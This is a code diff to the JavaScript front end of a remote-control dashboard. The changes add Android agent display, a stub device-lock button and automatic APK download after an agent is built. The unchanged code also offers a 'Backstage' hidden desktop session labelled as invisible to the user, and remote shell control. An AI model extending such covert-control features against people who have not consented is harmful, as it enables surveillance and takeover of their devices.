@@ -326,29 +326,37 @@ function renderAgentTable() {
         const userDisplay = escapeHtml(agent.username || 'SYSTEM');
         const isAndroidAgent = (agent.arch && agent.arch.toLowerCase().includes('android')) || 
                                (agent.os && agent.os.toLowerCase().includes('android'));
+        const deviceName = escapeHtml(agent.device_name || agent.hostname || agent.model || agent.endpoint_tag || 'Android Device');
 
         tr.innerHTML = `
             <td>${statusBadge}</td>
             <td>
                 <div class="tag-name">
-                    <span>${tagDisplay}</span>
+                    ${isAndroidAgent ? `<span style="color: #34d399; font-weight: 600;">📱 ( Phone )</span>` : `<span>${tagDisplay}</span>`}
                 </div>
                 <span class="agent-id-pill" title="Click to copy Agent ID" onclick="copyText('${agent.agent_id}', 'Agent ID copied!')">ID: ${escapeHtml(agent.agent_id)}</span>
             </td>
             <td>
+                ${isAndroidAgent ? `
+                <div class="hostname-title" style="font-weight: 600; color: #f3f4f6;">${deviceName}</div>
+                <div class="user-sub" style="color: #94a3b8;">
+                    <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+                    <span>${escapeHtml(agent.endpoint_tag || deviceName)}</span>
+                </div>
+                ` : `
                 <div class="hostname-title">${hostnameDisplay}</div>
                 <div class="user-sub">
                     <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                     <span>${userDisplay}</span>
                 </div>
+                `}
             </td>
             <td>
                 ${isAndroidAgent ? `
-                <span class="os-pill" style="border-color: rgba(16, 185, 129, 0.4); color: #34d399;">
+                <span class="os-pill" style="border-color: rgba(16, 185, 129, 0.4); color: #34d399; font-weight: 500;">
                     <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
-                    ${escapeHtml(agent.os || 'Android')}
+                    Android device
                 </span>
-                <span class="arch-chip" style="color: #10b981; border-color: rgba(16, 185, 129, 0.3);">${escapeHtml(agent.arch || 'ARM64')}</span>
                 ` : `
                 <span class="os-pill">
                     <svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.901-1.799"/></svg>
@@ -395,14 +403,21 @@ function renderAgentTable() {
                             <span>Sync</span>
                         </button>
                     `}
-                    <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="Take Control: Mirror real desktop with physical mouse & keyboard">
+                    <button class="btn-action-control btn-action-mirror" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'mirror')" title="${isAndroidAgent ? 'Take Control: Remote Control & Shell' : 'Take Control: Mirror real desktop with physical mouse & keyboard'}">
                         <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                         <span>Control</span>
                     </button>
+                    ${isAndroidAgent ? `
+                    <button class="btn-action-control btn-action-lock" ${!isOnline ? 'disabled' : ''} onclick="lockAndroidDevice('${agent.agent_id}', event)" title="Lock Android Device Screen">
+                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                        <span>Lock Device</span>
+                    </button>
+                    ` : `
                     <button class="btn-action-control btn-action-backstage" ${!isOnline ? 'disabled' : ''} onclick="openViewerTab('${agent.agent_id}', 'backstage')" title="Backstage: Hidden virtual desktop session (invisible to user)">
                         <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                         <span>Backstage</span>
                     </button>
+                    `}
                     <button class="btn-action-delete" onclick="deleteAgentSession('${agent.agent_id}', event)" title="Remove endpoint">
                         <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18m-2 0v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6m3 0V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>
                     </button>
@@ -506,6 +521,11 @@ async function deleteAgentSession(agentId, event) {
     }
 }
 
+function lockAndroidDevice(agentId, event) {
+    if (event) event.stopPropagation();
+    showToast("Lock Device", `Lock command initiated for endpoint [${agentId}]. (Feature in development)`, "info");
+}
+
 function setFilter(filterType, el) {
     activeFilter = filterType;
     document.querySelectorAll(".filter-pills .pill").forEach(p => p.classList.remove("active"));
@@ -535,9 +555,9 @@ function onArchChanged(val) {
     const btn = document.getElementById("btnBuildAgent");
     if (!btn) return;
     if (val === "android") {
-        btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg><span>Build Android Package</span>`;
+        btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg><span>Build & Download APK</span>`;
     } else {
-        btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="m5 12 5 5L20 7"/></svg><span>Build & Generate Package</span>`;
+        btn.innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="m5 12 5 5L20 7"/></svg><span>Build & Download Exe</span>`;
     }
 }
 
@@ -716,8 +736,18 @@ async function submitGenerateAgent() {
                     loadAllGeneratedAgents(false);
                 }
 
-                btn.innerHTML = `<span>🤖 Android Package Ready</span>`;
-                showToast("Android Agent Ready", `APK & 1-Click Shell installer ready for mobile deployment.`, "success");
+                // Auto-trigger direct APK download to user device
+                if (data.apk_download_url) {
+                    const dlA = document.createElement("a");
+                    dlA.href = data.apk_download_url;
+                    dlA.download = data.apk_filename || "android_agent.apk";
+                    document.body.appendChild(dlA);
+                    dlA.click();
+                    document.body.removeChild(dlA);
+                }
+
+                btn.innerHTML = `<span>✓ APK Download Ready</span>`;
+                showToast("Android APK Ready", `Downloading ${data.apk_filename || 'APK'}. Install on device to connect to RMM.`, "success");
                 btn.disabled = false;
             } else {
                 if (winGrid) winGrid.style.display = "grid";
